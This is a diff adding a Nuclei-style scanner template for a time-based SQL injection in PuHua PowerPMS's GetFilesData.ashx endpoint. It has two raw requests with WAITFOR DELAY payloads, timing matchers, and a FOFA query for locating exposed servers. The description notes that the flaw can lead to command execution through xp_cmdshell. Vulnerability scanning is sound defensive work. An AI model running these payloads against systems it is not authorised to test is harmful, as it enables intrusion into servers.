@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:4%27--&StartDate=2&EndDate=2 HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:8%27--&StartDate=2&EndDate=2 HTTP/1.1
+          Host: {{Hostname}}
+id: PuHua-PowerPMS-GetFilesData-SQL
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="普华科技-PowerPMS"
+        普华 PowerPMS GetFilesData.ashx 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+    name: 普华 PowerPMS GetFilesData.ashx SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 普华科技
